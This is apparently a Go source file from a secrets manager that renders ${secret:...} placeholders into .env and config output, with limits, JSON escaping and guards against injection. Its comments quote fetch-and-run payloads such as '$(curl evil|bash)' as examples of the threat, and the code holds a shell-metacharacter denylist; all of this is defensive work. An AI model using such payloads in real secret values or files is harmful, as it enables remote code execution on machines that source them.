// Package secrettemplate renders templates that embed Keyorix secret references,
// expanding ${secret:<ref>} placeholders to their values. It is the pure, transport-
// and storage-agnostic core: the caller supplies a Resolver that maps a reference to
// a value (with its own permission checks). Rendered output is never logged by this
// package.
//
// Render's default substitution is raw and format-agnostic, matching today's only
// callers (.env/config-style single-line KV rendering). A caller building a JSON or
// YAML document around a placeholder should use RenderJSON / yamlescape.RenderYAML
// (or RenderWithOptions with RenderOptions.Escape) instead, so a secret value can't
// break out of its quoted field and inject or overwrite an adjacent key. The YAML
// helpers live in the yamlescape subpackage so gopkg.in/yaml.v3 stays out of this
// package's (and internal/core's) dependency closure.
package secrettemplate

import (
	"encoding/json"
	"fmt"
	"strings"
)

// marker is the placeholder prefix; a reference looks like ${secret:<ref>}.
const marker = "${secret:"

// MaxDistinctReferences caps the number of distinct secret references a single
// template may name. Repeated occurrences of the same reference are deduped and
// resolved only once (see Render), so this bounds the number of resolver calls —
// and therefore the number of secret decryptions / audit reads — a single render
// can trigger, regardless of how many placeholder occurrences the template text
// contains. A template naming more references than this is rejected outright,
// before any resolver call is made. 100 comfortably covers realistic .env/config
// rendering use cases.
const MaxDistinctReferences = 100

// MaxOutputBytes caps the total size of a single rendered output. 1 MiB is
// generous for .env / config files; an attacker injecting many large secret
// values cannot use Render as an amplifier to produce a response that exhausts
// downstream memory.
const MaxOutputBytes = 1 << 20 // 1 MiB

// Resolver maps a secret reference (the text between "${secret:" and "}") to its
// value. It returns an error when the reference is unknown or inaccessible.
type Resolver func(ref string) (string, error)

// segment is one piece of a parsed template: a literal text run, or a secret
// reference to be substituted (ref is non-empty in that case).
type segment struct {
	ref     string
	literal string
}

// parse splits tmpl into literal/reference segments and returns the distinct
// references it names, in first-seen order — without calling any resolver.
// Doing this as a standalone pass lets Render enforce MaxDistinctReferences (and
// reject a malformed template) before any resolver call — and therefore before
// any decryption work — happens. Rules:
//   - "$$" collapses to a literal "$" — so "$${secret:x}" is the literal text
//     "${secret:x}" without naming a reference.
//   - a "$" not part of "$$" or a placeholder is literal.
//   - an unterminated placeholder (no closing "}") or an empty ref is an error.
//   - a template naming more than MaxDistinctReferences distinct references is
//     an error.
func parse(tmpl string) (segments []segment, distinct []string, err error) { // NOSONAR -- cognitive complexity 25, suppress go:S3776
	seen := make(map[string]bool)
	for i := 0; i < len(tmpl); {
		c := tmpl[i]
		if c != '$' {
			j := i + 1
			for j < len(tmpl) && tmpl[j] != '$' {
				j++
			}
			segments = append(segments, segment{literal: tmpl[i:j]})
			i = j
			continue
		}
		// c == '$'
		if i+1 < len(tmpl) && tmpl[i+1] == '$' {
			segments = append(segments, segment{literal: "$"}) // "$$" -> "$"
			i += 2
			continue
		}
		if strings.HasPrefix(tmpl[i:], marker) {
			rest := tmpl[i+len(marker):]
			end := strings.IndexByte(rest, '}')
			if end < 0 {
				return nil, nil, fmt.Errorf("unterminated ${secret:…} placeholder at offset %d", i)
			}
			ref := strings.TrimSpace(rest[:end])
			if ref == "" {
				return nil, nil, fmt.Errorf("empty secret reference at offset %d", i)
			}
			if !seen[ref] {
				if len(distinct) >= MaxDistinctReferences {
					return nil, nil, fmt.Errorf("template names more than %d distinct secret references (limit is %d)", MaxDistinctReferences, MaxDistinctReferences)
				}
				seen[ref] = true
				distinct = append(distinct, ref)
			}
			segments = append(segments, segment{ref: ref})
			i += len(marker) + end + 1 // past the closing '}'
			continue
		}
		// A lone '$' that doesn't start a placeholder.
		segments = append(segments, segment{literal: "$"})
		i++
	}
	return segments, distinct, nil
}

// EscapeFunc transforms one resolved secret value immediately before it is written
// into the rendered output, so it can be embedded safely in a specific output
// format (see RenderOptions.Escape). It runs AFTER Render's newline/CR/NUL and
// shell-metacharacter guards below — those guards inspect the raw resolver output,
// so their rejection behavior is identical regardless of which EscapeFunc (or none)
// is configured; Escape only changes how a value that already passed those guards
// is written out.
type EscapeFunc func(string) string

// RenderOptions configures optional processing beyond Render's default raw,
// format-agnostic substitution. The zero value (Escape == nil) reproduces Render's
// exact current behavior, so passing RenderOptions{} to RenderWithOptions is
// identical to calling Render — existing callers that never opt in are unaffected.
type RenderOptions struct {
	// Escape, when non-nil, is applied to each resolved secret value before it is
	// substituted into the output (template literal text is never escaped, only
	// resolved reference values). Leave nil for Render's traditional raw-substitution
	// behavior, which is still correct for the documented .env/config use case where
	// a rendered line is consumed as-is.
	//
	// Set this when the template itself is a JSON or YAML document (or fragment) that
	// embeds a placeholder inside a quoted string field, e.g.
	// `{"password": "${secret:prod/db}"}`. Without escaping, a secret value
	// containing an unescaped '"', '\', or other format-significant character can
	// break out of the intended string field and inject or overwrite an adjacent
	// key — the secret's value is controlled by whoever can write that one secret,
	// who may be far less trusted than the template's author. EscapeJSONString and
	// yamlescape.EscapeYAMLString (or the RenderJSON / yamlescape.RenderYAML
	// convenience wrappers) close that gap for their respective formats.
	Escape EscapeFunc
}

// EscapeJSONString escapes val so it can be embedded inside a JSON string literal's
// quotes (i.e. as the value written between the surrounding `"..."` a JSON/text
// template already supplies) without letting val's content close that string early
// or alter the document's structure — quotes, backslashes, and control characters
// (including newlines) are all escaped per the JSON string grammar. It does NOT add
// the surrounding quotes itself, since the template is expected to already contain
// them (e.g. `"${secret:prod/db}"` inside a JSON document).
func EscapeJSONString(val string) string {
	// encoding/json's string encoding already implements exactly this escaping
	// (RFC 8259 §7); marshal the value as a JSON string and strip the quotes
	// json.Marshal adds, rather than reimplementing the escape table by hand.
	b, err := json.Marshal(val)
	if err != nil {
		// json.Marshal on a plain Go string cannot fail (no cycles, no unsupported
		// types) — this is unreachable in practice. Fall back to a value that is at
		// least guaranteed not to contain a raw '"' or '\', rather than panicking.
		return strings.NewReplacer(`\`, `\\`, `"`, `\"`).Replace(val)
	}
	return string(b[1 : len(b)-1])
}

// RenderJSON is Render with Escape set to EscapeJSONString: use it when tmpl is a
// JSON document or fragment that embeds ${secret:<ref>} placeholders inside quoted
// string fields, so a substituted secret value cannot break out of its field.
func RenderJSON(tmpl string, resolve Resolver) (string, error) {
	return RenderWithOptions(tmpl, resolve, RenderOptions{Escape: EscapeJSONString})
}

// Render expands every ${secret:<ref>} placeholder in tmpl using resolve and returns
// the result. See parse for the placeholder syntax rules and the
// MaxDistinctReferences cap; a resolver error aborts the render, naming the
// offending reference.
//
// Each distinct reference is resolved (resolve is called) at most once, in
// first-seen order; repeated occurrences of the same reference in tmpl reuse the
// already-resolved value rather than calling resolve again. This avoids
// redundant decryption work — and, on the server-side resolver, redundant
// audit/read-logging — when a template repeats a reference, and combined with
// MaxDistinctReferences bounds the total resolver work a single render can
// trigger regardless of how many placeholder occurrences the template contains.
//
// Render performs no format-specific escaping of substituted values — see
// RenderOptions.Escape / RenderJSON / yamlescape.RenderYAML for that. This is equivalent to
// RenderWithOptions(tmpl, resolve, RenderOptions{}).
func Render(tmpl string, resolve Resolver) (string, error) {
	return RenderWithOptions(tmpl, resolve, RenderOptions{})
}

// RenderWithOptions is Render with optional additional processing — currently just
// format-specific escaping of substituted values, see RenderOptions.Escape. Passing
// the zero RenderOptions{} is identical to Render.
func RenderWithOptions(tmpl string, resolve Resolver, opts RenderOptions) (string, error) {
	segments, distinct, err := parse(tmpl)
	if err != nil {
		return "", err
	}

	resolved := make(map[string]string, len(distinct))
	for _, ref := range distinct {
		val, err := resolve(ref)
		if err != nil {
			return "", fmt.Errorf("resolve %q: %w", ref, err)
		}
		// By default (RenderOptions.Escape == nil, i.e. plain Render) this package is a
		// raw, format-agnostic substitution engine: it doesn't know whether the
		// caller's template is a .env file, a YAML/JSON document, or a shell script, so
		// it applies no format-specific escaping (quoting a YAML scalar, JSON-string-
		// escaping, shell-quoting, ...) unless the caller opts in via
		// RenderOptions.Escape / RenderJSON / yamlescape.RenderYAML below. What every one of those
		// targets shares, though, is that an embedded newline/CR turns one substituted
		// value into multiple *lines* of output, and the documented use case
		// (internal/cli/secret/render.go) is exactly "write this straight to a .env/
		// config file, which may later be sourced". A secret's value is set by
		// whoever has write access to that one secret — who may be far less trusted
		// than the template's author or the file's eventual consumer — so a value
		// containing "\ncurl evil|bash\n#" would silently smuggle extra executable
		// lines into the rendered file. Rather than silently stripping/altering the
		// secret value (surprising, and could itself corrupt a legitimately multi-line
		// value), reject the render outright: this matches Render's existing all-or-
		// nothing failure model for a resolver error, and forces the operator to
		// notice rather than silently ship injected content. NUL is rejected for the
		// same reason (embedded NUL truncates/corrupts many downstream parsers).
		if strings.ContainsAny(val, "\n\r\x00") {
			return "", fmt.Errorf("resolve %q: secret value contains a newline, carriage return, or NUL byte and cannot be safely substituted into a single-line template output", ref)
		}
		// The newline/CR/NUL check above closes the multi-line variant of the
		// bash-`source .env` RCE this package documents as its motivating threat,
		// but an *unquoted* shell assignment (`KEY=value`, the exact shape a
		// rendered .env line takes) still evaluates its right-hand side even on a
		// single line: a value of "$(curl evil|bash)", a backtick-quoted command,
		// a bare ";"/"|"/"&" command separator, or a "<"/">" redirection all
		// execute or take effect when the file is later sourced, with no newline
		// required. Reject the classic shell metacharacters for the same reason
		// we reject newlines: fail the render rather than silently ship a value
		// that runs as code (or redirects output) in the documented consumption
		// path. (This is a denylist and therefore incomplete defense-in-depth,
		// not a substitute for shell-quoting the output.)
		if strings.ContainsAny(val, "`;|&<>") || strings.Contains(val, "$(") {
			return "", fmt.Errorf("resolve %q: secret value contains a shell metacharacter and cannot be safely substituted into output that may later be sourced as a shell script", ref)
		}
		// Format-specific escaping (opts.Escape, see RenderOptions) runs AFTER the
		// guards above, on the value that already passed them — so the guards' raw-
		// value rejection behavior is unconditional and identical whether or not an
		// EscapeFunc is configured. Escape only changes how a value that passed those
		// guards is subsequently embedded in the output.
		if opts.Escape != nil {
			val = opts.Escape(val)
		}
		resolved[ref] = val
	}

	var b strings.Builder
	for _, seg := range segments {
		if seg.ref == "" {
			b.WriteString(seg.literal)
		} else {
			b.WriteString(resolved[seg.ref])
		}
		if b.Len() > MaxOutputBytes {
			return "", fmt.Errorf("rendered output exceeds the %d-byte limit", MaxOutputBytes)
		}
	}
	return b.String(), nil
}

// References returns the distinct secret references in tmpl, in first-seen order,
// without resolving them — useful for a dry-run / "what does this template need?"
// preflight. Malformed placeholders, or a template exceeding MaxDistinctReferences,
// are reported as an error, matching Render.
func References(tmpl string) ([]string, error) {
	_, distinct, err := parse(tmpl)
	if err != nil {
		return nil, err
	}
	return distinct, nil
}
